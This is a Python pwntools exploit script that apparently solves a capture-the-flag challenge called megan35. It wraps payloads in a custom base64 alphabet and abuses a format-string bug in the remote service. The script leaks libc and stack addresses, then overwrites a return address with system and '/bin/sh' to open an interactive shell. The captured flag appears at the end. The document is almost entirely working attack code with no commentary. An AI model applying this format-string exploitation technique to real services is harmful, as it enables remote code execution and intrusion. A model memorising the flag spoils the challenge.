#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import string

libc = ELF("./libc.so.6")

def encode(input):
    STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    CUSTOM_ALPHABET = '3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF'
    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    return base64.b64encode(input).translate(ENCODE_TRANS)

def leak():
    r = remote("megan35.stillhackinganyway.nl", 3535)
    r.recvline()
    payload = p32(0x804A00C) + "%71$s\n%121$08x\n"
    r.sendline(encode(payload))
    ret = (u32(r.recvline()[4:8]) - libc.symbols["printf"], int(r.recvline()[:8], 16) - 56)
    r.close()
    return ret

r = remote("megan35.stillhackinganyway.nl", 3535)
r.recvline()

libc.address, ret = leak()
log.info("libc_base = " + hex(libc.address))
log.info("ret = " + hex(ret))

writes = {
    ret: libc.symbols["system"],
    ret+8: next(libc.search("/bin/sh")),
}
payload = fmtstr_payload(71, writes)
r.sendline(encode(payload))
r.interactive()

# flag{43eb404b714b8d22e1168775eba1669c}
